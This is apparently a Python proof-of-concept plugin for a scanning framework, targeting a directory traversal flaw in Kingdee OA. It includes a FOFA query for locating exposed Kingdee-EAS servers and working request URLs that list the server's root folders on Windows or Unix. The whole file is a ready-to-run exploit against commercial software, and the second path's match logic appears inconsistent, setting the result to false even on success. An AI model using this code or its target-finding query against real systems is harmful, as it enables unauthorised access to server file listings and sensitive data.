# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "金蝶OA server_file 目录遍历漏洞",                        # 漏洞名称
        "VulnID" : "Blen-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "金蝶OA",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Kingdee-EAS"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/appmonitor/protected/selector/server_file/files?folder=C://&suffix=" # url自己按需调整
        url1 = self.target + "/appmonitor/protected/selector/server_file/files?folder=/&suffix=" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and "\"name\":\"" in req0.text and "\"path\":\"" in req0.text and "\"folder\":" in req0.text:
                vuln = [True,req0.text]
            else:
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and "\"name\":\"" in req1.text and "\"path\":\"" in req1.text and "\"folder\":" in req1.text:
                    vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()